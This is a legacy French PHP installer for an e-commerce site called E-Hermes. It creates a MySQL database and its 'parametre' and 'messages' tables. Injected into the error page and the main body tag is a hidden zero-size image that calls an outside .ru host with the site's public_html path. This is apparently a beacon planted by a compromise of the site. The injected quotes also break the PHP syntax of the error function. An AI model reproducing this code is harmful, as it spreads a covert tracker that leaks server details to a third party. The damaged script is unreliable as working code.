<?php
/* Fichier : Creation.php
* Description : Creation des tables nécessaire à un programme
* Auteur : Denis Léveillé 	 		  Date : 2004-01-01

Attention 
N'utilisez pas extract sur des données inconnues, comme les données 
utilisateurs ( $_GET , etc). Si vous le faites, par exemple, pour rendre 
compatible un vieux code avec register_globals à Off de façon temporaire, 
assurez-vous d'utiliser l'une des constantes extract_type qui n'écrasent 
pas les valeurs, comme EXTR_SKIP . Sachez aussi que vous devez maintenant 
extraire $_SERVER , $_SESSION , $_COOKIE , $_POST et $_GET dans cet ordre. 
 
*/

session_start();

include("vartb.inc");
include("varcie.inc");

function MetMessErreur( $Erreur, $Message, $NoErr )
{
include("varcie.inc");
	echo "
      <html>
      <head>
      <title>Page d'Erreur</title>
      </head>
	  <SCRIPT language=JavaScript1.2 src='javafich/mm_menu.js'></SCRIPT>
	  <SCRIPT language=JavaScript1.2 src='javafich/loadmenu.js'></SCRIPT>
      <body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	  <SCRIPT language=JavaScript1.2>mmLoadMenus();</SCRIPT>
	  <BASE TARGET=MAIN>
      <h2 align='center' style='margin-top: .7in'>
      Erreur: $NoErr - $Erreur</h2>
      <div align='center'>
      <p style='margin-top: .5in'>
      <b>Message : $Message</b>
      <form action='Support.php' method='post'>
         <input type='submit' value='Retour à la page précédente'>
      </form>
      </div>
      <p align='center' valign='bottom'><font size='1'><br>
      <br>
      Les droits de reproduction de ce site © 2008 <?php echo $NomCie ?>.<br>
      Tous droits réservés. © 2008 <br>
      </font></p>
      </body>
      </html>
   \n";
   exit();
}

?>

<html>
<head>
<title>Page de création des tables E-Hermes</title>
</head>
<script language='JavaScript1.2' src="javafich/mm_menu.js"></script> 
<script language='JavaScript1.2' src="javafich/loadmenu.js"></script>
<body bgcolor='#6666FF' topmargin='0' leftmargin='0' marginheight='0' marginwidth='0'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<script language='JavaScript1.2'>mmLoadMenus();</script>

<?php

// Connection au serveur MySQL
$Connection = mysql_connect( $host, $user, $password)
	or MetMessErreur(mysql_error(), "Connection impossible au serveur", mysql_errno() );

$db = mysql_select_db( $database, $Connection );


if( $db != 0 )
	MetMessErreur("ERREUR BASE DE DONNÉES DÉJÀ EXISTANTE","Opération de création INVALIDE", $db );

echo "
     <p align='center'><font size='2'><br>
      CREATION DE LA BASE DE DONNÉES<br>
      </font></p>
     ";

$sql = "CREATE DATABASE $database";
$result = mysql_query( $sql )
	or MetMessErreur("ERREUR DE CRÉATION", "Impossible de créer la base de données", $result );

$db = mysql_select_db( $database, $Connection );

// *** TABLE PARAMETRE
echo "
     <p align='center'><font size='2'><br>
     CREATION DE LA TABLE PARAMETRE<br>
      </font></p>
     ";
$sql = "CREATE TABLE `parametre` (
  `id` int(11) NOT NULL auto_increment,
  `nom_client` varchar(50) NOT NULL default '',
  `courriel_client` varchar(50) NOT NULL default '',
  `adresse_client` varchar(50) NOT NULL default '',
  `ville_client` varchar(25) NOT NULL default '',
  `codepostal_client` varchar(10) NOT NULL default '',
  `telephone_client` varchar(100) default NULL,
  `fax_client` varchar(15) NOT NULL default '',
  `province_client` varchar(30) default NULL,
  `pays_client` varchar(30) default NULL,
  `www_client` varchar(50) NOT NULL default '',
  `no_tps` varchar(20) NOT NULL default '',
  `no_tvq` varchar(20) NOT NULL default '',
  `tvq` float default NULL,
  `tps` float default NULL,
  `mode_paiement_carte` int(11) NOT NULL default '0',
  `mode_paiement_ligne` int(11) NOT NULL default '0',
  `mode_paiement_cheque` int(11) NOT NULL default '0',
  `fr` int(11) NOT NULL default '0',
  `en` int(11) NOT NULL default '0',
  `sp` int(11) NOT NULL default '0',
  `url_douane` varchar(100) NOT NULL default 'http://www.aduana.co.cu/valora.htm',
  `url` varchar(60) NOT NULL default '',
  `url_ssl` varchar(60) NOT NULL default '',
  `url_payeur` varchar(100) default NULL,
  `url_payeur_test` varchar(100) default NULL,
  `id_payeur` varchar(20) default NULL,
  `cle_payeur` varchar(20) default NULL,
  `email_compte` varchar(60) NOT NULL default 'account@transant.com',
  `email_envoi` varchar(60) NOT NULL default 'account@transant.com',
  `Email_facture` varchar(255) NOT NULL default 'ventes@antillas-express.com',
  `Email_commande` varchar(255) NOT NULL default 'ventes@antillas-express.com',
  `email_administration` varchar(50) NOT NULL default '',
  `email_clientele` varchar(60) default NULL,
  `email_paquet` varchar(50) NOT NULL default '',
  `email_support` varchar(50) NOT NULL default '',
  `email_ventes` varchar(50) NOT NULL default '',
  `email_pharmacie` varchar(50) default NULL,
  `email_info` varchar(50) default NULL,
  `largeur_affichage` varchar(5) NOT NULL default '127',
  `largeur_achat` varchar(5) NOT NULL default '570',
  `alignement` enum('right','center','left') NOT NULL default 'left',
  `categorie_affichage` tinyint(1) NOT NULL default '0',
  `banque` smallint(2) NOT NULL default '1',
  `image_special_largeur` tinyint(3) NOT NULL default '110',
  `image_special_haut` tinyint(3) NOT NULL default '110',
  `image_list_largeur` tinyint(3) NOT NULL default '100',
  `image_list_hauteur` tinyint(3) NOT NULL default '100',
  `image_mid_height` varchar(5) NOT NULL default '',
  `image_mid_weight` varchar(5) NOT NULL default '',
  `ventes` int(11) NOT NULL default '0',
  `Transfert` tinyint(4) NOT NULL default '1',
  `MaxTransfert` decimal(6,2) NOT NULL default '3000.00',
  `ClientMaxCredit` decimal(5,2) NOT NULL default '5.00',
  `DefMaxAchat` decimal(6,2) NOT NULL default '1000.00',
  `clients` int(11) NOT NULL default '0',
  `inventaire` int(11) NOT NULL default '0',
  `soumissions` int(11) NOT NULL default '0',
  `agenda` int(11) NOT NULL default '0',
  `livraisons` int(11) NOT NULL default '0',
  `paiement_par_cheque` tinyint(1) NOT NULL default '0',
  `album_photos` int(11) NOT NULL default '0',
  `panier_actif` int(11) NOT NULL default '0',
  `path_show_main` int(11) NOT NULL default '0',
  `scat_show_main` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;
";

$result = mysql_query( $sql )
	or MetMessErreur("ERREUR DE CRÉATION", "Impossible de créer la table PARAMETRE", $result );

// *** TABLE MESSAGES
echo "
     <p align='center'><font size='2'><br>
     CREATION DE LA TABLE MESSAGES<br>
      </font></p>
     ";
$sql = "CREATE TABLE `messages` (
  `Langue` varchar(4) NOT NULL default 'fr',
  `page_title` varchar(255) NOT NULL default '',
  `Msg_erreur_top` varchar(50) NOT NULL default 'PAGE D''ERREUR',
  `Msg_err_401` varchar(60) NOT NULL default 'VOUS N''AVEZ PAS D''AUTORISATION POUR ACCÉDER À CETTE PAGE',
  `Msg_info_401` tinytext,
  `Msg_err_403` varchar(60) NOT NULL default 'Forbidden',
  `Msg_info_403` varchar(120) NOT NULL default 'The server understood the request, but is refusing to fulfill it.',
  `Msg_erreur_info` varchar(70) default NULL,
  `Msg_err_404` varchar(50) default NULL,
  `Msg_info_404` tinytext,
  `Msg_err_400` varchar(60) NOT NULL default 'Bad Request',
  `Msg_info_400` varchar(100) NOT NULL default 'The request could not be understood by the server due to malformed syntax',
  `Msg_err_405` varchar(60) NOT NULL default 'Method Not Allowed',
  `Msg_info_405` varchar(120) NOT NULL default 'The method specified in the Request-Line is not allowed for the resource identified by the Request-URI.',
  `Msg_err_500` varchar(60) NOT NULL default 'Internal Server Error',
  `Msg_info_500` varchar(120) NOT NULL default 'The server encountered an unexpected condition which prevented it from fulfilling the request.',
  `Msg_page_prec` varchar(50) NOT NULL default 'Pour revenir à la page précédente',
  `Msg_bd_connect` tinytext,
  `Msg_bd_select` tinytext,
  `Msg_tab_acces` tinytext,
  `form_nocli` varchar(20) NOT NULL default 'No Client',
  `form_prenom` varchar(25) NOT NULL default '',
  `form_nom` varchar(25) NOT NULL default '',
  `form_contact` varchar(50) NOT NULL default 'Contact',
  `form_entreprise` varchar(50) NOT NULL default '',
  `form_courriel` varchar(25) NOT NULL default '',
  `form_rue` varchar(25) NOT NULL default '',
  `form_indication` varchar(50) NOT NULL default 'Indication',
  `form_quartier` varchar(50) NOT NULL default 'Quartier',
  `form_ville` varchar(25) NOT NULL default '',
  `form_province` varchar(25) NOT NULL default '',
  `form_pays` varchar(25) NOT NULL default '',
  `form_codepostal` varchar(25) NOT NULL default '',
  `form_telephone` varchar(25) NOT NULL default '',
  `form_telephone2` varchar(25) NOT NULL default '',
  `form_telecopieur` varchar(25) NOT NULL default '',
  `form_soumettre` varchar(25) NOT NULL default '',
  `form_password` varchar(25) NOT NULL default '',
  `form_verif_password` varchar(40) NOT NULL default '',
  `form_check_password` varchar(40) NOT NULL default '',
  `form_new_password` varchar(25) NOT NULL default '',
  `Mess_incorrect` varchar(128) NOT NULL default ' incorrecte ou absente.',
  `Msg_ajcli_sujet` varchar(100) default NULL,
  `Msg_ajcli_mess` text,
  `Msg_ajcli_ecran` text,
  `Entrez_courriel` varchar(50) NOT NULL default 'Entrez votre adresse de courriel :',
  `Envoyez_password` varchar(30) NOT NULL default 'Envoyez-moi mon mot de passe',
  `Pas_compte_courriel` varchar(150) NOT NULL default '',
  `Password_sujet` varchar(150) NOT NULL default '',
  `Password_message` text NOT NULL,
  `Password_envoyer` text NOT NULL,
  `Password_pas_envoyer` varchar(100) default NULL,
  `Msg_RespectCase` varchar(120) default 'Veuillez respecter la case ( minuscule et majuscule ) du mot de passe que l''on vous a envoyer S.V.P.',
  `Msg_Change_psw` varchar(100) default 'Vous pouvez maintenant changer votre mot de passe dans la section <b>Accéder à mon compte</b>.',
  `Msg_erreur_connection` varchar(100) default 'Erreur à la connexion. Veuillez entrer un nom et mot de passe concordants et valides.',
  `connexion_erreur_msn` varchar(250) NOT NULL default '',
  `connexion_deja_connecte_msn` varchar(250) NOT NULL default '',
  `bouton_deja_clique` varchar(100) NOT NULL default 'Vous avez déjà cliquer ce bouton...veuillez patienter !',
  `La_Date` varchar(15) NOT NULL default 'Date',
  `id_Facture` varchar(40) NOT NULL default 'FACTURE',
  `no_Facture` varchar(20) NOT NULL default 'No Facture',
  `facture_refus_sujet` varchar(100) NOT NULL default '',
  `facture_ok_sujet` varchar(100) NOT NULL default '',
  `facture_depasse_sujet` varchar(100) NOT NULL default '',
  `facture_duplicata` varchar(30) NOT NULL default ' ( Duplicata )',
  `note_bas_facture` varchar(255) NOT NULL default '',
  `id_Commande` varchar(20) NOT NULL default 'COMMANDE',
  `no_Commande` varchar(20) NOT NULL default 'No Commande',
  `plus_de_details` varchar(222) NOT NULL default '',
  `ajouter_votre_panier` varchar(222) NOT NULL default '',
  `voir_album_photos` varchar(222) NOT NULL default '',
  `envoyer_ami` varchar(222) NOT NULL default '',
  `sujet_ami` varchar(50) NOT NULL default '%s et %s %s vous offre un produit!',
  `visiter_produit` varchar(50) NOT NULL default 'Cliquez ici pour visiter ce produit',
  `envoyer_courriel` varchar(25) NOT NULL default 'Le courriel a été envoyé.',
  `accueil` varchar(66) NOT NULL default '',
  `afficher_prix_en_devise` varchar(222) NOT NULL default '',
  `toutes_categories` varchar(111) NOT NULL default '',
  `rechercher` varchar(111) NOT NULL default '',
  `mon_panier_dachat` varchar(111) NOT NULL default '',
  `mon_compte` varchar(111) NOT NULL default '',
  `fermer_la` varchar(111) NOT NULL default '',
  `ouvrir_une` varchar(111) NOT NULL default '',
  `acceder_a` varchar(111) NOT NULL default '',
  `creer` varchar(111) NOT NULL default '',
  `votre_panier_est_vide` varchar(111) NOT NULL default '',
  `txt_intro_panier_show` text NOT NULL,
  `continuer_a_magasiner` varchar(222) NOT NULL default '',
  `retour_etape_finale` varchar(222) NOT NULL default '',
  `passer_a_la_caisse` varchar(222) NOT NULL default '',
  `montant_fournit` varchar(100) NOT NULL default 'Aucun montant fournit !',
  `montant_depasse` varchar(100) NOT NULL default 'Le monatant dépasse la limite permise.',
  `sous_total` varchar(222) NOT NULL default '',
  `description` varchar(44) NOT NULL default '',
  `quantite` varchar(44) NOT NULL default '',
  `prix_unitaire` varchar(44) NOT NULL default '',
  `prix` varchar(44) NOT NULL default '',
  `supprimer` varchar(255) NOT NULL default '',
  `Livraison` varchar(30) default NULL,
  `Surcharge` varchar(30) default NULL,
  `etat` varchar(20) NOT NULL default 'Etat',
  `paye` varchar(20) NOT NULL default 'Payé',
  `transfert` varchar(20) NOT NULL default 'Livraison',
  `tx_Change_USD` varchar(30) NOT NULL default 'Taux de change USD',
  `tx_Change_CAD` varchar(30) NOT NULL default 'Taux de change CAD',
  `tx_Change_EUR` varchar(30) NOT NULL default 'Taux de change EUR',
  `utiliser_cette_adresse_dexpedition` varchar(255) NOT NULL default '',
  `creer_nouvelle_adresse_dexpedition` varchar(255) NOT NULL default '',
  `choisissez_un_pays` varchar(222) NOT NULL default '',
  `choisissez_une_province` varchar(222) NOT NULL default '',
  `passez_a_letape_suivante` varchar(222) NOT NULL default '',
  `paiement_en_ligne_securise` varchar(222) NOT NULL default '',
  `modifier_cette_adresse` varchar(222) NOT NULL default '',
  `prenom_et_nom_du_detenteur_dela_carte` varchar(222) NOT NULL default '',
  `paiement_par_carte_de_credit` varchar(222) NOT NULL default '',
  `numero_de_carte` varchar(222) NOT NULL default '',
  `date_expiration` varchar(222) NOT NULL default '',
  `detenteur` varchar(20) NOT NULL default 'Détenteur',
  `no_Autorisation` varchar(20) NOT NULL default 'No Autorisation',
  `mois` varchar(222) NOT NULL default '',
  `annee` varchar(222) NOT NULL default '',
  `titre_paiement` varchar(50) default 'Compléter le paiement',
  `total_a_payer` varchar(30) default 'Total à payer',
  `reference` varchar(50) default 'Référence',
  `annuler` varchar(30) default 'Annuler',
  `msg_interac_1` varchar(50) default 'Transférez des fonds par courriel',
  `msg_interac_2` text,
  `msg_interac_3` varchar(50) default 'Le fonctionnement?',
  `msg_interac_4` text,
  `adresse_dexpedition` varchar(222) NOT NULL default '',
  `methode_de_paiement` varchar(222) NOT NULL default '',
  `no_carte_invalide` varchar(222) NOT NULL default '',
  `expiration` varchar(222) NOT NULL default '',
  `date_expiration_invalide` varchar(222) NOT NULL default '',
  `sommaire_dela_commande` varchar(222) NOT NULL default '',
  `modifier` varchar(222) NOT NULL default '',
  `frais_de` varchar(222) NOT NULL default '',
  `total` varchar(222) NOT NULL default '',
  `devez_corriger_info_rouge_avant_achat` varchar(255) NOT NULL default '',
  `placer_ma_commande` varchar(222) NOT NULL default '',
  `adresse_de_facturation` varchar(222) NOT NULL default '',
  `entrez_nom_detenteur_carte` varchar(222) NOT NULL default '',
  `frais` text NOT NULL,
  `facture_votre_carte` varchar(100) NOT NULL default ' $ (CAD) sera facturé sur votre carte de crédit.',
  `msg_accepte` text,
  `msg_refuse` text,
  `msg_depasse` text,
  `recherche_ignore_critere_moins_3_caracteres` varchar(222) NOT NULL default '',
  `aucun_produit_recherche` varchar(222) NOT NULL default '',
  `message_merci` tinytext,
  `menuTopInscrire` varchar(20) default NULL,
  `menuTopAide` varchar(20) default NULL,
  `menuTopContactez` varchar(20) default NULL,
  `TitreWeb` varchar(255) default NULL,
  `MetaDescription` varchar(255) default NULL,
  `MetaKeyword` text,
  `ChxLangue1` varchar(20) default NULL,
  `ChxLangue2` varchar(20) default NULL,
  `ChxMenuAccueil` varchar(20) NOT NULL default 'ACCUEIL',
  `ChxMenuAchat` varchar(20) default NULL,
  `ChxMenuArgent` varchar(20) default NULL,
  `ChxMenuPaquet` varchar(20) default NULL,
  `ChxMenuConsulaire` varchar(20) default NULL,
  `ChxMenuCadeau` varchar(22) default NULL,
  `ChxMenuVoiture` varchar(20) default NULL,
  `ChxMenuAssurance` varchar(20) default NULL,
  `ChxMenuContactez` varchar(20) NOT NULL default 'CONTACTEZ-NOUS',
  `ChxMenuAide` varchar(20) NOT NULL default 'AIDE',
  `TxtArgent` tinytext,
  `TxtConsulaire` tinytext,
  `TxtAchat` tinytext,
  `TxtColis` tinytext,
  `TxtCertificat` tinytext,
  `Veuillez_terminer_transaction` text,
  `Aucun_produit_cat` varchar(255) default NULL,
  `Tous_champs_oblig` varchar(128) NOT NULL default '',
  `Heures_Ouverture` tinytext,
  `Merci_contacter` tinytext NOT NULL,
  `Contactez_nous` varchar(24) NOT NULL default '',
  `Par_courriel` varchar(24) NOT NULL default '',
  `Choisissez_Département` varchar(64) NOT NULL default '',
  `Choisissez` varchar(24) NOT NULL default '',
  `contact_admin` varchar(30) default NULL,
  `contact_colis` varchar(30) default NULL,
  `contact_clientele` varchar(30) default NULL,
  `contact_transfert` varchar(30) default NULL,
  `contact_commande` varchar(30) default NULL,
  `contact_pharmacie` varchar(30) default NULL,
  `contact_commentaire` varchar(50) default NULL,
  `Remplissez_formulaire` varchar(64) default NULL,
  `form_destinataire` varchar(40) default NULL,
  `Vos_coordonnees` varchar(64) default NULL,
  `Vos_amis` varchar(64) default NULL,
  `Votre_nom` varchar(24) NOT NULL default '',
  `Votre_prenom` varchar(64) default NULL,
  `Votre_courriel` varchar(24) NOT NULL default '',
  `Votre_message` varchar(24) NOT NULL default '',
  `Par_telephone` varchar(24) NOT NULL default '',
  `Telephone` varchar(24) NOT NULL default '',
  `Sans_frais` varchar(24) NOT NULL default '',
  `Telecopieur` varchar(24) NOT NULL default '',
  `Par_la_poste` varchar(24) NOT NULL default '',
  `Adresse` tinytext NOT NULL,
  `Horaire` tinytext,
  `Important` varchar(128) NOT NULL default '',
  `Terminer_transaction` text NOT NULL,
  `Speciaux` varchar(100) default NULL,
  `sommaire_dela_livraison` varchar(40) NOT NULL default 'SOMMAIRE DE LA LIVRAISON',
  `SCRIBA` varchar(10) default NULL,
  `ecrivez_proches` varchar(50) default NULL,
  `envoyer_lettre_ligne` varchar(50) default NULL,
  `messagerie` varchar(20) default NULL,
  `envois_paquets1` varchar(50) default NULL,
  `envois_paquets2` varchar(20) default NULL,
  `service_profesionnel1` varchar(100) default NULL,
  `service_profesionnel2` varchar(255) default NULL,
  `effectuer_paiement1` varchar(50) default NULL,
  `effectuer_paiement2` varchar(255) default NULL,
  `assurer_envoi1` varchar(50) default NULL,
  `assurer_envoi2` tinytext,
  `envoyer_paquet1` varchar(50) default NULL,
  `envoyer_paquet2` varchar(50) default NULL,
  `courrier_regulier` varchar(100) default NULL,
  `web_douanes` varchar(20) default NULL,
  `model` varchar(50) default NULL,
  `demarche_consulaire` varchar(30) default NULL,
  `utilisez_formulaire` varchar(70) default NULL,
  `traitement_passeport` varchar(50) default NULL,
  `personne_cuba` varchar(120) default NULL,
  `form_demande` varchar(50) default NULL,
  `traite_passeport` varchar(30) default NULL,
  `indication_demande` varchar(100) default NULL,
  `lettre_invit` varchar(30) default NULL,
  `cuba_avant1971` varchar(70) default NULL,
  `condition_avant1971` varchar(140) default NULL,
  `Assurance` varchar(50) NOT NULL default 'Assurance',
  `Mess_Assurance_1` varchar(100) NOT NULL default 'Assurance offerte aux citoyens ou résidents canadiens ou non-canadiens',
  `consulter_RBC` varchar(100) NOT NULL default 'Veuillez consulter les polices en cliquant sur le lien ci-dessous',
  `url_1_RBC` varchar(100) NOT NULL default 'http://www.rbcinsurance.com/travel/pdf/deluxe-package-single-trip-e.pdf',
  `Mess_url_1_RBC` varchar(100) NOT NULL default 'Deluxe package single trip pdf Doc',
  `Forfait_RBC` varchar(100) NOT NULL default 'Veuillez choisir votre forfait assurance en cliquant sur le lien ci-dessous',
  `url_2_RBC` varchar(100) NOT NULL default 'http://www.rbcinsurance.com/travel/travel-insurance-packages.html',
  `Mess_url_2_RBC` varchar(100) NOT NULL default 'Forfaits complets d''assurance voyage',
  `Mess_Assurance_2` varchar(100) NOT NULL default 'Assurance Asistur, Assurance offerte aux non-canadiens',
  `consulter_Asistur` varchar(100) NOT NULL default '',
  `URL_Asistur` varchar(100) NOT NULL default 'assurances_asistur.php',
  `Mess_url_Asistur` varchar(50) NOT NULL default 'INFORMATION',
  `Politique_confidentialite` varchar(40) NOT NULL default 'Politique de confidentialité',
  `Securite_transactions` varchar(40) NOT NULL default 'Sécurité des transactions',
  `Termes_conditions` varchar(40) NOT NULL default 'Termes et conditions',
  `Service_clientele` varchar(40) NOT NULL default 'Service à la clientèle',
  `Qui_sommes_nous` varchar(40) NOT NULL default 'Qui sommes-nous ?',
  `Certificat_marchand` varchar(40) NOT NULL default 'Certificat de marchand',
  `Au_Sujet_SSL` varchar(40) NOT NULL default 'Au sujet du certificat SSL',
  `NOUVEAU` varchar(100) NOT NULL default 'NOUVEAU...PLACER & PAYER VOTRE ENVOI EN LIGNE.',
  `Paquet` varchar(20) NOT NULL default 'PAQUET',
  `Envoi_Paquet` varchar(40) NOT NULL default 'NEW...ORDER & PAY YOUR SHIPPING ONLINE',
  `Chx_Envoi_Online` varchar(50) NOT NULL default 'Cliquez ici pour commander votre envoi en ligne',
  `sommaire_du_transfert` varchar(40) NOT NULL default 'SOMMAIRE DU TRANSFERT',
  `sommaire_du_certificat` varchar(40) NOT NULL default 'DÉTAIL DU CERTIFICAT',
  `montant_certificat` varchar(40) NOT NULL default 'Montant Certificat',
  `courriel_existant` varchar(100) NOT NULL default 'Ce courriel est déja utilisé.',
  `adresse_livraison` text NOT NULL,
  `Mess_cheque_mandat` text,
  `Mess_carte` text,
  PRIMARY KEY  (`Langue`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;";

$result = mysql_query( $sql )
	or MetMessErreur("ERREUR DE CRÉATION", "Impossible de créer la table MESSAGES", $result );

?>

<div align='center'>
   <p style='margin-top: .5in'>
   <b>CREATION TERMINER AVEC SUCCÈS<br></b>
   <form action='Support.php' method='post'>
   	<input type='submit' value='Retour à la page précédente'>
   </form>
</div>
<br>
<div align="center"><font size="-1">
Nous apprécierions vos commentaires et suggestions. Vous pouvez les adresser
à <a href="mailto:<?php echo $AdrCourriel ?>?subject=Page Web Nomcie">Webmestre</a>
</font></div>
         <p align="center" valign="bottom"><font size="1"><br>
         <br>
         Les droits de reproduction de ce site © 2008 <?php echo $NomCie ?>.<br>
         Tous droits réservés. © 2008 <br>
         </p>
</body>
</html>